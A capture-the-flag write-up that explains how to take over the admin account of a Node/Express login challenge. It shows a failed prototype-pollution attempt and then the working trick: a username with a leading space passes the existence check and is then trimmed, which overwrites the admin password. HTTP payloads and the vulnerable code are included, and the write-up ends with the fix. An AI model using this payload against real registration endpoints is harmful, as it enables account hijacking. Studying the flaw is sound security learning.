# Challenge

Login as an admin! (login page: https://chal43-alal08.vercel.app/)

# Solution

## First Thoughts

Pollute the `users` object via a payload like:

```
POST {{url}}/register HTTP/1.1
Content-Type: application/json

{
  "username": "__proto__",
  "password": "EveryonesNewP@ssword!"
}
```

but this would not work due to the following check within the `/register` endpoint:

```js
if (users[username]) {
  return res.status(400).json({ message: "Username already exists" });
}
```

Since `users.__proto__` exists by default, this would not work.  

## Found It

Take a close look at the `/register` endpoint - this is where the vulnerability is at.

```js
app.post("/register", (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) {
    return res.status(400).json({ message: "Username and password are required" });
  } 

  // check password strength (8 char min, special char, digit, uppercase and lowercase)
  const passwordRegex = /^(?=.*d)(?=.*[a-z])(?=.*[A-Z])(?=.*[^a-zA-Z0-9]).{8,}$/; 
  
  if (!passwordRegex.test(password)) {
    return res.status(400).json({ message: "Password needs to be at least 8 charecters long and include at least one: digit, lowecase letter, uppercase letter and a special charecter" });
  } 

  if (users[username]) {
    return res.status(400).json({ message: "Username already exists" });
  } else {
    //successfully registered
    const user = (users[username.trim()] = {});
    user.password = password;
    res.status(201).json({ message: "Registration successful" });
  }
});
```

## Solved

Look at how they are ***validating*** and then ***setting/saving*** the username.

1. The first check makes sure the username you attempted to register doesn't already exist.

2. ***AFTER*** they make sure that the username doesn't already exist, they call `trim` on the username you sent.

```js
/**
 * 1. HERE IS WHERE THEY MAKE SURE THE USERNAME DOESN'T ALREADY EXIST.
 */
if (users[username]) {
  return res.status(400).json({ message: "Username already exists" });
} else {
  //successfully registered
  /**
   * 2. HERE IS WHERE THEY CALL `trim` ON THE USERNAME
   */
  const user = (users[username.trim()] = {});
  user.password = password;
  res.status(201).json({ message: "Registration successful" });
}
```

Do you see where this is going?

Only ***AFTER*** they verify the username doesn't already exist, they call `trim`. This means you can send a payload with 1 or more leading or trailing space(s) in the username and it will pass the initial "already exists" check.

They will remove the space(s) for us by calling `trim`, which means we can override the admin account by sending a payload like:

```
POST {{url}}/register HTTP/1.1
Content-Type: application/json

{
  "username": " admin", // "admin ", // <-- this would also work
  "password": "0verRide!"
}
```

Therefore, `" admin"` will be trimmed to `"admin"`, and we have successfully changed the admin password. 

Now we can login with the password we chose in order to get a JWT. We can then use this JWT to view the admin profile.

## TLDR

They should be trimming the username PRIOR to any validation checks. The fact they trim after validation allows us to override the admin account password.